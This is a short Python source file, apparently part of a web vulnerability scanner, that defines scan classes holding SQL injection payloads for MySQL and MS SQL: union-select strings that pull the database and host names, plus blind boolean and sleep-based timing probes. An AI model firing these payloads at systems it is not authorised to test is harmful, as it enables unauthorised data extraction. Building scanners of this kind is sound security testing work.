from scanner.core.base_scan import BaseScan
from copy import deepcopy


class UnionSqliScan(BaseScan):
    class MySQLScan(BaseScan):
        attack_vectors = ['0\' union select 1,2,3,database()#',
                          '0\' union select 1,2,3,database()-- ']

    class MsSQLScan(BaseScan):
        attack_vectors = ['0\' union select 1,2,3,db_name()-- ',
                          '0\' union select 1,2,3,host_name()-- ']


class BlindSqliScan(BaseScan):

    class MySQLScan(BaseScan):
        attack_vectors = ['0\' and 1=1#',
                          '0\' and if(database()>\'a\',sleep(5),1)#',
                          '0\' or ascii(mid(database(),1,1))>30#']
